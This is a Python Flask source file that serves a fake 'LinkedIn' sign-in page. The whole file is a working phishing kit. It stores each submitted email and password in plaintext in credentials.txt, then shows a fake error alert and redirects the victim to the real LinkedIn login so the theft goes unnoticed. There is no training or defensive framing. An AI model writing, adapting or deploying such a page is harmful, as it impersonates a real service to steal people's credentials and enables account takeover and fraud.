from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with open('credentials.txt', 'a') as file:
            file.write(f'Email: {email}, Password: {password}\n')
        return ''' 
        <script>
            alert("Something went wrong. Try again.");
            window.location.href = "https://www.linkedin.com/login";
        </script>
        '''
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Register</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                display: flex;
                flex-direction: column;
                align-items: center;
                height: 100vh;
                margin: 0;
                position: relative;
            }
            .container {
                background: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
                width: 300px;
                text-align: center;
                margin-top: 50px;
            }
        </style>
    </head>
    <body>
        <div class="linkedin-logo">LinkedIn</div>
        <div class="container">
            <h2>Sign in</h2>
            <form method="post">
                <label>Email:</label>
                <input type="email" name="email" required>

                <label>Password:</label>
                <input type="password" name="password" required>

                <button type="submit">Register</button>
            </form>
        </div>
    </body>
    </html>
    ''')
if __name__ == '__main__':
    app.run(debug=True)
